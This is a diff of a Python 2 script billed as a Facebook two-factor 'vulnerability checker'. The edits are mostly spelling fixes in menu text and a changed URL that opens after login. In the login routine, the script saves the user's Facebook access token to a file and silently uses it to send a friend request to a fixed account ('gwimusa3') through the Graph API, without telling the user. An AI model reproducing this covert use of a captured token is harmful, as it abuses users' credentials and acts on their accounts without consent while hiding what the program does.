@@ -539,7 +539,7 @@ def login():
         print "2.\x1b[1;95mWhat is Facebook Two Factor Authentication Vulnerability Checker?"
         time.sleep(0.05)
 	
-        print "3.\x1b[1;95mLogin using link token"
+        print "3.\x1b[1;95mLogin using Link Token"
         time.sleep(0.05)
 	
 	print "0.\033[1;95mExit           "
@@ -573,7 +573,7 @@ def login1():
                 time.sleep(0.05)
 		print logo13
 		jalan(' \033[1;91mNote Do Not Use Facebook Account without Two Factor Authentication' )
-		jalan(' \033[1;92mFacebook Login May Caused Security Sheck, Take Your Own Risk' )
+		jalan(' \033[1;92mFacebook Login May Caused Security Check, Use At Your Own Risk' )
 		
 		print "\033[1;93mGive Some Credits to Alexander Grayson"
 		print('	' )
@@ -606,7 +606,7 @@ def login1():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;95mLogin Successfully'
-				os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')
+				os.system('xdg-open https://www.facebook.com/profile.php?id=100022849337180')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -663,7 +663,7 @@ def menu():
         time.sleep(0.05)
 	print "1 .\x1b[1;94m\033[1;94mStart Vulnerability Check   "
         time.sleep(0.05)
-        print "2 .\x1b[1;94m\033[1;94mAll About Two Factor Checker        "
+        print "2 .\x1b[1;94m\033[1;94mAll About Two Factor Checker?        "
         time.sleep(0.05)
 	print "0 .\033[1;94m\033[1;94mLogout                         "
 	pilih()
